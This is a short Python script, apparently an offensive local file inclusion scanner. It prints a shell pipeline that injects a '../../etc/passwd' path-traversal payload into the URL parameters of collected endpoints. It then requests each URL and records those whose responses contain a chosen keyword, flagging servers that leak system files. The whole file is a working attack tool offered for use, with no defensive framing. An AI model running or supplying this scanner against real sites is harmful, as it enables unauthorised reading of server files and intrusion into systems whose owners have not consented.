import requests
from termcolor import colored as cl

print(" ")
print(cl("Command : cat endpoints | grep \"=\" | gf lfi | qsrelace ../../../../../../../../etc/passwd >> LFI_Params.txt", color='red'))
print(" ")
fil = input(cl("Enter Your File >>> ", color='blue'))
print("")
urls = open(fil, 'r').read().split('\n')

def LFI_Scan(match):
    print(cl("LFI Scan Started...", color='red'))
    for url in urls:
        try:
            req = requests.get(url).text
            if match in req:
                print(cl(f"Check This ===> {url}", color='green'))
                print(" ")
                lfi = open("LFI_Results", 'a')
                lfi.write(f"{url}\n")
            else:
                pass
        except Exception as e:
            #print(e)
            continue

match = input(cl("Enter Match Keyword >>> ", color='blue'))
LFI_Scan(match)
